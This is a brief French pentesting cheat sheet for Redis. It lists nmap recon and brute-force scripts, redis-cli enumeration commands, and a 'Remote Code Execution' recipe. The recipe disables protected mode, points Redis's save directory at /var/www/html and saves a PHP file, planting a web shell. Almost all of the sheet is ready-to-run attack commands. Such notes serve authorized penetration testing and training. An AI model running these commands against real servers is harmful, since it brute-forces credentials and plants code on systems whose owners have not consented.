
# Reconnaissance

	nmap --script redis-info -sV -p 6379 <IP>
	nmap --script redis-brute -sV -p 6379 <IP>
	
	redis-cli -h <IP>
	redis-cli -h <IP> --user <USER> -a <PASSWORD>

# Énumération basique

	> INFO
	> CLIENT INFO
	> config get *
	> config get dir
	> keys *
	> hgetall *
	

# Remote Code Execution
	
	> config set protected-mode no
	> config set dir /var/www/html
	> config set dbfilename command.php
	> set test "<?php phpinfo(); ?>"
	> save

# Liens utiles 

- https://redis.io/docs/latest/
- https://hackviser.com/tactics/pentesting/services/redis
- https://book.hacktricks.wiki/en/network-services-pentesting/6379-pentesting-redis.html
